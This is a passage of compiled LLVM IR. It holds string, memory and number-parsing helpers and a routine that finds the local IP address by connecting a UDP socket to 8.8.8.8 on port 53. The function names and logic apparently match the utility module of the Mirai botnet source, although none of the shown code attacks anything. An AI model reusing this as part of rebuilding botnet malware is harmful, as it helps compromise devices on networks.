  br label %4

4:                                                ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %13

10:                                               ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %3, align 4
  br label %4, !llvm.loop !60

13:                                               ; preds = %4
  %14 = load i32, i32* %3, align 4
  ret i32 %14
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_memcpy(i8* noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

11:                                               ; preds = %15, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %21

15:                                               ; preds = %11
  %16 = load i8*, i8** %8, align 8
  %17 = getelementptr inbounds i8, i8* %16, i32 1
  store i8* %17, i8** %8, align 8
  %18 = load i8, i8* %16, align 1
  %19 = load i8*, i8** %7, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %7, align 8
  store i8 %18, i8* %19, align 1
  br label %11, !llvm.loop !61

21:                                               ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_zero(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

7:                                                ; preds = %11, %2
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  br i1 %10, label %11, label %14

11:                                               ; preds = %7
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %5, align 8
  store i8 0, i8* %12, align 1
  br label %7, !llvm.loop !62

14:                                               ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_atoi(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

11:                                               ; preds = %16, %2
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  br label %16

16:                                               ; preds = %11
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 noundef signext %18)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %11, label %21, !llvm.loop !63

21:                                               ; preds = %16
  %22 = load i32, i32* %6, align 4
  %23 = icmp eq i32 %22, 45
  br i1 %23, label %24, label %29

24:                                               ; preds = %21
  store i32 1, i32* %8, align 4
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  store i32 %28, i32* %6, align 4
  br label %38

29:                                               ; preds = %21
  %30 = load i32, i32* %6, align 4
  %31 = icmp eq i32 %30, 43
  br i1 %31, label %32, label %37

32:                                               ; preds = %29
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %3, align 8
  %35 = load i8, i8* %33, align 1
  %36 = sext i8 %35 to i32
  store i32 %36, i32* %6, align 4
  br label %37

37:                                               ; preds = %32, %29
  br label %38

38:                                               ; preds = %37, %24
  %39 = load i32, i32* %8, align 4
  %40 = icmp ne i32 %39, 0
  %41 = zext i1 %40 to i64
  %42 = select i1 %40, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %42, i64* %7, align 8
  %43 = load i64, i64* %7, align 8
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = urem i64 %43, %45
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %10, align 4
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = load i64, i64* %7, align 8
  %51 = udiv i64 %50, %49
  store i64 %51, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %52

52:                                               ; preds = %107, %38
  %53 = load i32, i32* %6, align 4
  %54 = trunc i32 %53 to i8
  %55 = call i32 @util_isdigit(i8 noundef signext %54)
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %52
  %58 = load i32, i32* %6, align 4
  %59 = sub nsw i32 %58, 48
  store i32 %59, i32* %6, align 4
  br label %76

60:                                               ; preds = %52
  %61 = load i32, i32* %6, align 4
  %62 = trunc i32 %61 to i8
  %63 = call i32 @util_isalpha(i8 noundef signext %62)
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %74

65:                                               ; preds = %60
  %66 = load i32, i32* %6, align 4
  %67 = trunc i32 %66 to i8
  %68 = call i32 @util_isupper(i8 noundef signext %67)
  %69 = icmp ne i32 %68, 0
  %70 = zext i1 %69 to i64
  %71 = select i1 %69, i32 55, i32 87
  %72 = load i32, i32* %6, align 4
  %73 = sub nsw i32 %72, %71
  store i32 %73, i32* %6, align 4
  br label %75

74:                                               ; preds = %60
  br label %112

75:                                               ; preds = %65
  br label %76

76:                                               ; preds = %75, %57
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %4, align 4
  %79 = icmp sge i32 %77, %78
  br i1 %79, label %80, label %81

80:                                               ; preds = %76
  br label %112

81:                                               ; preds = %76
  %82 = load i32, i32* %9, align 4
  %83 = icmp slt i32 %82, 0
  br i1 %83, label %96, label %84

84:                                               ; preds = %81
  %85 = load i64, i64* %5, align 8
  %86 = load i64, i64* %7, align 8
  %87 = icmp ugt i64 %85, %86
  br i1 %87, label %96, label %88

88:                                               ; preds = %84
  %89 = load i64, i64* %5, align 8
  %90 = load i64, i64* %7, align 8
  %91 = icmp eq i64 %89, %90
  br i1 %91, label %92, label %97

92:                                               ; preds = %88
  %93 = load i32, i32* %6, align 4
  %94 = load i32, i32* %10, align 4
  %95 = icmp sgt i32 %93, %94
  br i1 %95, label %96, label %97

96:                                               ; preds = %92, %84, %81
  store i32 -1, i32* %9, align 4
  br label %106

97:                                               ; preds = %92, %88
  store i32 1, i32* %9, align 4
  %98 = load i32, i32* %4, align 4
  %99 = sext i32 %98 to i64
  %100 = load i64, i64* %5, align 8
  %101 = mul i64 %100, %99
  store i64 %101, i64* %5, align 8
  %102 = load i32, i32* %6, align 4
  %103 = sext i32 %102 to i64
  %104 = load i64, i64* %5, align 8
  %105 = add i64 %104, %103
  store i64 %105, i64* %5, align 8
  br label %106

106:                                              ; preds = %97, %96
  br label %107

107:                                              ; preds = %106
  %108 = load i8*, i8** %3, align 8
  %109 = getelementptr inbounds i8, i8* %108, i32 1
  store i8* %109, i8** %3, align 8
  %110 = load i8, i8* %108, align 1
  %111 = sext i8 %110 to i32
  store i32 %111, i32* %6, align 4
  br label %52

112:                                              ; preds = %80, %74
  %113 = load i32, i32* %9, align 4
  %114 = icmp slt i32 %113, 0
  br i1 %114, label %115, label %120

115:                                              ; preds = %112
  %116 = load i32, i32* %8, align 4
  %117 = icmp ne i32 %116, 0
  %118 = zext i1 %117 to i64
  %119 = select i1 %117, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %119, i64* %5, align 8
  br label %127

120:                                              ; preds = %112
  %121 = load i32, i32* %8, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %123, label %126

123:                                              ; preds = %120
  %124 = load i64, i64* %5, align 8
  %125 = sub i64 0, %124
  store i64 %125, i64* %5, align 8
  br label %126

126:                                              ; preds = %123, %120
  br label %127

127:                                              ; preds = %126, %115
  %128 = load i64, i64* %5, align 8
  %129 = trunc i64 %128 to i32
  ret i32 %129
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isspace(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp eq i32 %4, 32
  br i1 %5, label %18, label %6

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp eq i32 %8, 9
  br i1 %9, label %18, label %10

10:                                               ; preds = %6
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp eq i32 %12, 10
  br i1 %13, label %18, label %14

14:                                               ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp eq i32 %16, 10
  br label %18

18:                                               ; preds = %14, %10, %6, %1
  %19 = phi i1 [ true, %10 ], [ true, %6 ], [ true, %1 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  ret i32 %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isdigit(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 48
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 57
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isalpha(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br i1 %9, label %20, label %10

10:                                               ; preds = %6, %1
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 97
  br i1 %13, label %14, label %18

14:                                               ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp sle i32 %16, 122
  br label %18

18:                                               ; preds = %14, %10
  %19 = phi i1 [ false, %10 ], [ %17, %14 ]
  br label %20

20:                                               ; preds = %18, %6
  %21 = phi i1 [ true, %6 ], [ %19, %18 ]
  %22 = zext i1 %21 to i32
  ret i32 %22
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isupper(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_memsearch(i8* noundef %0, i32 noundef %1, i8* noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

15:                                               ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %50

16:                                               ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

17:                                               ; preds = %46, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %49

21:                                               ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %44

35:                                               ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %11, align 4
  %38 = load i32, i32* %9, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %40, label %43

40:                                               ; preds = %35
  %41 = load i32, i32* %10, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  br label %50

43:                                               ; preds = %35
  br label %45

44:                                               ; preds = %21
  store i32 0, i32* %11, align 4
  br label %45

45:                                               ; preds = %44, %43
  br label %46

46:                                               ; preds = %45
  %47 = load i32, i32* %10, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %10, align 4
  br label %17, !llvm.loop !64

49:                                               ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %50

50:                                               ; preds = %49, %40, %15
  %51 = load i32, i32* %5, align 4
  ret i32 %51
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_stristr(i8* noundef %0, i32 noundef %1, i8* noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* noundef %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %16

16:                                               ; preds = %82, %3
  %17 = load i32, i32* %6, align 4
  %18 = add nsw i32 %17, -1
  store i32 %18, i32* %6, align 4
  %19 = icmp sgt i32 %17, 0
  br i1 %19, label %20, label %83

20:                                               ; preds = %16
  %21 = load i8*, i8** %8, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %8, align 8
  %23 = load i8, i8* %21, align 1
  store i8 %23, i8* %11, align 1
  %24 = load i8*, i8** %7, align 8
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  store i8 %28, i8* %12, align 1
  %29 = load i8, i8* %11, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp sge i32 %30, 65
  br i1 %31, label %32, label %40

32:                                               ; preds = %20
  %33 = load i8, i8* %11, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp sle i32 %34, 90
  br i1 %35, label %36, label %40

36:                                               ; preds = %32
  %37 = load i8, i8* %11, align 1
  %38 = sext i8 %37 to i32
  %39 = or i32 %38, 96
  br label %43

40:                                               ; preds = %32, %20
  %41 = load i8, i8* %11, align 1
  %42 = sext i8 %41 to i32
  br label %43

43:                                               ; preds = %40, %36
  %44 = phi i32 [ %39, %36 ], [ %42, %40 ]
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %11, align 1
  %46 = load i8, i8* %12, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp sge i32 %47, 65
  br i1 %48, label %49, label %57

49:                                               ; preds = %43
  %50 = load i8, i8* %12, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp sle i32 %51, 90
  br i1 %52, label %53, label %57

53:                                               ; preds = %49
  %54 = load i8, i8* %12, align 1
  %55 = sext i8 %54 to i32
  %56 = or i32 %55, 96
  br label %60

57:                                               ; preds = %49, %43
  %58 = load i8, i8* %12, align 1
  %59 = sext i8 %58 to i32
  br label %60

60:                                               ; preds = %57, %53
  %61 = phi i32 [ %56, %53 ], [ %59, %57 ]
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* %12, align 1
  %63 = load i8, i8* %11, align 1
  %64 = sext i8 %63 to i32
  %65 = load i8, i8* %12, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp eq i32 %64, %66
  br i1 %67, label %68, label %81

68:                                               ; preds = %60
  %69 = load i32, i32* %10, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %10, align 4
  %71 = load i32, i32* %9, align 4
  %72 = icmp eq i32 %70, %71
  br i1 %72, label %73, label %80

73:                                               ; preds = %68
  %74 = load i8*, i8** %8, align 8
  %75 = load i8*, i8** %5, align 8
  %76 = ptrtoint i8* %74 to i64
  %77 = ptrtoint i8* %75 to i64
  %78 = sub i64 %76, %77
  %79 = trunc i64 %78 to i32
  store i32 %79, i32* %4, align 4
  br label %84

80:                                               ; preds = %68
  br label %82

81:                                               ; preds = %60
  store i32 0, i32* %10, align 4
  br label %82

82:                                               ; preds = %81, %80
  br label %16, !llvm.loop !65

83:                                               ; preds = %16
  store i32 -1, i32* %4, align 4
  br label %84

84:                                               ; preds = %83, %73
  %85 = load i32, i32* %4, align 4
  ret i32 %85
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_local_addr() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %2, align 4
  store i32 16, i32* %4, align 4
  %7 = call i32* @__errno_location() #8
  store i32 0, i32* %7, align 4
  %8 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #7
  store i32 %8, i32* %2, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %0
  store i32 0, i32* %1, align 4
  br label %35

11:                                               ; preds = %0
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = call i32 @htonl(i32 noundef 134744072) #8
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %15 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i32 %13, i32* %15, align 4
  %16 = call zeroext i16 @htons(i16 noundef zeroext 53) #8
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = load i32, i32* %2, align 4
  %19 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %20 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %20, %struct.sockaddr** %19, align 8
  %21 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %22 = load %struct.sockaddr*, %struct.sockaddr** %21, align 8
  %23 = call i32 @connect(i32 noundef %18, %struct.sockaddr* %22, i32 noundef 16)
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %union.__CONST_SOCKADDR_ARG* %6 to %struct.sockaddr**
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %26, %struct.sockaddr** %25, align 8
  %27 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %6, i32 0, i32 0
  %28 = load %struct.sockaddr*, %struct.sockaddr** %27, align 8
  %29 = call i32 @getsockname(i32 noundef %24, %struct.sockaddr* %28, i32* noundef %4) #7
  %30 = load i32, i32* %2, align 4
  %31 = call i32 @close(i32 noundef %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %33 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 4
  store i32 %34, i32* %1, align 4
  br label %35

35:                                               ; preds = %11, %10
  %36 = load i32, i32* %1, align 4
  ret i32 %36
}

; Function Attrs: nounwind
declare i32 @getsockname(i32 noundef, %struct.sockaddr*, i32* noundef) #1

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { argmemonly nofree nounwind willreturn }
attributes #7 = { nounwind }
attributes #8 = { nounwind readnone willreturn }
attributes #9 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
!48 = distinct !{!48, !7}
!49 = distinct !{!49, !7}
!50 = distinct !{!50, !7}
!51 = distinct !{!51, !7}
!52 = distinct !{!52, !7}
!53 = distinct !{!53, !7}
!54 = distinct !{!54, !7}
!55 = distinct !{!55, !7}
!56 = distinct !{!56, !7}
!57 = distinct !{!57, !7}
!58 = distinct !{!58, !7}
!59 = distinct !{!59, !7}
!60 = distinct !{!60, !7}
!61 = distinct !{!61, !7}
!62 = distinct !{!62, !7}
!63 = distinct !{!63, !7}
!64 = distinct !{!64, !7}
!65 = distinct !{!65, !7}
